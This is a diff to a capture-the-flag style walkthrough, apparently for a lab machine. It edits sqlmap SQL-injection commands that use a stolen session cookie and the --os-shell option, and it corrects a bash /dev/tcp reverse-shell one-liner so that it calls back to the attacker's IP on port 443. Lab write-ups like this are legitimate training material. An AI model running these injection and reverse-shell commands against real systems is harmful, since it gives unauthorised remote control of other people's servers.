@@ -84,15 +84,11 @@ sudo apt install sqlmap
 - Obtain PHPSESSID cookie value from Firefox cookie editor
 - Run sqlmap
 ```bash
-sqlmap -u 'http://10.129.95.174/dashboard.php?search=any+query' --cookie="PHPSESSID=j1uot4n07trl1k8b95mmthoqj1"
+sqlmap -u 'http://10.129.95.174/dashboard.php?search=any+query' --cookie="PHPSESSID=nkan6hs1lafti3cc82bbddkdu9"
 ```
 - Run sqlmap with --os-shell option to obtain shell
 ```bash
-sqlmap -u 'http://10.129.95.174/dashboard.php?search=any+query' --cookie="PHPSESSID=j1uot4n07trl1k8b95mmthoqj1" --os-shell
-```
-- Stabilize the shell
-```bash
-bash -c "bash -i >& /dev/tcp/10.129.95.174/443 0>&1"
+sqlmap -u 'http://10.129.95.174/dashboard.php?search=any+query' --cookie="PHPSESSID=nkan6hs1lafti3cc82bbddkdu9" --os-shell
 ```
 - Turn on netcat listener
 ```bash
@@ -100,7 +96,7 @@ sudo nc -lvnp 443
 ```
 - Execute the payload
 ```bash
-bash -c "bash -i >& /dev/tcp/10.129.95.174/443 0>&1"
+bash -c "bash -i >& /dev/tcp/10.10.15.222/443 0>&1"
 ```
 - By checking the listener, the shell has been activated. Make it fully interactive
 ```bash
